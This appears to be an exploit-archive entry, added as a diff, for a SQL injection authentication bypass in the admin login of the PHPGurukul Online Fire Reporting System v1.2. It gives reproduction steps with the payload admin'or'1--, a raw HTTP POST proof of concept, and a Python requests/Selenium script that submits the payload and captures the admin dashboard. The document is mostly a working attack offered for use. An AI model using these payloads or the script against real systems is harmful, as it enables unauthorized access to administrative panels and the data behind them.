@@ -1,0 +1,138 @@
+id: 39556
+date: 04/15/2024
+title: Online Fire Reporting System OFRS - SQL Injection Authentication Bypass Exploit
+author: Diyar Saadi
+cves: 
+
+# Exploit Title: Online Fire Reporting System SQL Injection Authentication Bypass
+# Exploit Author: Diyar Saadi
+# Vendor Homepage: https://phpgurukul.com/online-fire-reporting-system-using-php-and-mysql/
+# Software Link: https://phpgurukul.com/projects/Online-Fire-Reporting-System-using-PHP.zip
+# Version: V 1.2
+# Tested on: Windows 11 + XAMPP 8.0.30
+
+## Exploit Description ##
+
+SQL Injection Vulnerability in ofrs/admin/index.php :
+The SQL injection vulnerability in the ofrs/admin/index.php script arises from insecure handling of user input during the login process.
+
+## Steps to reproduce ##
+
+1- Open the admin panel page by following URL : http://localhost/ofrs/admin/index.php
+2- Enter the following payload from username-box : admin'or'1--
+3- Press Login button or press Enter .
+
+## Proof Of Concept [1] ##
+
+POST /ofrs/admin/index.php HTTP/1.1
+Host: localhost
+Content-Length: 46
+Cache-Control: max-age=0
+sec-ch-ua: "Chromium";v="121", "Not A(Brand";v="99"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+Upgrade-Insecure-Requests: 1
+Origin: http://localhost
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: http://localhost/ofrs/admin/index.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=fmnj70mh1qo2ssv80mlsv50o29
+Connection: close
+
+username=admin%27or%27--&inputpwd=&login=login
+
+## Proof Of Concept [ Python Based Script ] [2] ##
+
+import os
+import requests
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+import pyautogui
+
+
+banner = """
+
+
+
+
+
+
+
+
+░█████╗░███████╗██████╗░░██████╗  ░█████╗░███╗░░░███╗░██████╗
+██╔══██╗██╔════╝██╔══██╗██╔════╝  ██╔══██╗████╗░████║██╔════╝
+██║░░██║█████╗░░██████╔╝╚█████╗░  ██║░░╚═╝██╔████╔██║╚█████╗░
+██║░░██║██╔══╝░░██╔══██╗░╚═══██╗  ██║░░██╗██║╚██╔╝██║░╚═══██╗
+╚█████╔╝██║░░░░░██║░░██║██████╔╝  ╚█████╔╝██║░╚═╝░██║██████╔╝
+░╚════╝░╚═╝░░░░░╚═╝░░╚═╝╚═════╝░  ░╚════╝░╚═╝░░░░░╚═╝╚═════╝░
+# Code By : Diyar Saadi
+
+
+
+
+
+
+
+                                                                        """
+
+print(banner)
+
+payload_requests = input("Enter the payload: ")
+
+url_requests = "http://localhost/ofrs/admin/index.php"
+data = {
+    'username': payload_requests,
+    'password': 'password',
+    'login': 'Login'
+}
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Custom-Header': 'Your-Custom-Value'
+}
+
+try:
+    response = requests.post(url_requests, data=data, headers=headers, allow_redirects=False)
+
+    if response.status_code == 302 and response.headers.get('Location') and 'dashboard.php' in response.headers['Location']:
+        print("Requests version: Admin Panel Successfully Bypassed !")
+
+        url_selenium = "http://localhost/ofrs/admin/index.php"
+
+        chrome_driver_path = "C:\\Windows\\webdriver\\chromedriver.exe"
+
+        chrome_options = webdriver.ChromeOptions()
+        chrome_options.add_argument("executable_path=" + chrome_driver_path)
+
+        driver = webdriver.Chrome(options=chrome_options)
+        driver.get(url_selenium)
+
+        pyautogui.typewrite(payload_requests)
+        pyautogui.press('tab') 
+        pyautogui.typewrite(payload_requests)
+
+        pyautogui.press('enter')
+
+        WebDriverWait(driver, 10).until(EC.url_contains("dashboard.php"))
+
+        screenshot_path = os.path.join(os.getcwd(), "dashboard_screenshot.png")
+        driver.save_screenshot(screenshot_path)
+        print(f"Selenium version: Screenshot saved as {screenshot_path}")
+
+        driver.quit()
+
+    else:
+        print("Requests version: Login failed.")
+except Exception as e:
+    print(f"An error occurred: {e}")
+
+#  0day.today [2024-04-21]  #
